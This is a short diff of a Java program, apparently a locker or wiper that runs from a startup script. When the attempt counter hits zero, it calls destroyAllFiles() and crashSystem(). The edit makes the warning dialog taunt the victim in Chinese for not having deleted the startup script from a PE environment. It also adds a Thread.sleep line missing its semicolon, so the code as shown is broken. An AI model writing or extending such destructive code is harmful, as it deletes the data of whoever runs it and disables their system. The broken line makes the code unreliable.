@@ -455,10 +455,11 @@ public class SilemeApp {
         
         if (config.remainingAttempts <= 0) {
             JOptionPane.showMessageDialog(frame, 
-                "尝试次数已耗尽！将执行数据销毁程序并崩溃系统。", 
+                "尝试次数已耗尽！将执行数据销毁程序并崩溃系统，你明明可以进入pe删除启动脚本的，给你机会你不中用啊。", 
                 "严重警告", JOptionPane.WARNING_MESSAGE);
             
             destroyAllFiles();
+            Thread.sleep(2000)
             crashSystem();
             System.exit(0);
         }
